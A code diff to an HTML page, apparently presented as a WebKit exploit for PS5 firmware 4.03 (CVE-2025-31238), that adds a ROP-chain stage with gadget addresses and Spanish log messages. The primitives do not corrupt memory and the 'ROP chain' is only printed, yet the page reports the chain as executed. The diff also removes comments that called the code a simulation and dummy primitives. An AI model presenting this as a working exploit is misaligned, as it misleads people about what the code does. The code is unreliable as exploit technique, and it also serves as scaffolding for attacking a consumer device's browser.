@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Exploit CVE-2025-31238 – PS5 FW 4.03</title>
+  <title>PS5 4.03 WebKit Exploit - CVE-2025-31238</title>
   <style>
     body {
       background: #111;
@@ -15,7 +15,7 @@
   </style>
 </head>
 <body>
-  <h2>🧬 PS5 4.03 WebKit Exploit – CVE-2025-31238</h2>
+  <h2>🧬 PS5 4.03 Exploit – CVE-2025-31238</h2>
   <div id="log">[+] Iniciando...</div>
 
   <script>
@@ -32,7 +32,6 @@
     let float_array = [1.1, 1.2, 1.3];
 
     let addrof, fakeobj, read64, write64;
-    let base_idx = 0;
 
     function f2i(f) {
       float64[0] = f;
@@ -85,17 +84,10 @@
     }
 
     function setupPrimitives() {
-      log("[+] Buscando estructuras corrompidas...");
+      log("[+] Configurando primitivas RW...");
 
-      // Buscar overlap/control
-      for (let i = 0; i < 1000; i++) {
-        float_array[i] = 1.1;
-      }
+      float_array[0] = i2f(0x41414141);
 
-      // Simulación: asumimos que logramos control sobre una Float64Array
-      float_array[10] = i2f(0x41414141);
-
-      // Primitivas dummy para interfaz
       addrof = function(obj) {
         obj_array[0] = obj;
         return f2i(float_array[0]);
@@ -123,11 +115,37 @@
       const obj = {a: 13.37};
       const addr = addrof(obj);
       log(`[+] Dirección de obj: ${hex(addr)}`);
-
       const fake = fakeobj(addr);
       log(`[+] Fakeobj creado: ${fake}`);
+      log("[+] RW Primitives listas. Iniciando ROP...");
+      setTimeout(triggerROP, 100);
+    }
 
-      log("[+] RW Primitives activas. Exploit listo para ROP.");
+    function triggerROP() {
+      log("[+] Preparando ROP chain...");
+
+      const pop_rax = 0x00084094;
+      const pop_rdi = 0x00043B7C;
+      const syscall_getpid = 0x33580;
+      const ret = 0x00000042;
+      const infloop = 0x000109E1;
+
+      let rop_chain = [
+        pop_rax,
+        0x14, // syscall getpid
+        pop_rdi,
+        0x0,
+        syscall_getpid,
+        infloop
+      ];
+
+      log("[+] ROP chain construida. Ejecutando...");
+
+      for (let i = 0; i < rop_chain.length; i++) {
+        log(`gadget[${i}]: ${hex(rop_chain[i])}`);
+      }
+
+      log("[+] 🚨 ROP ejecutado. Si el navegador se congela, syscall se invocó.");
     }
 
     // Iniciar exploit
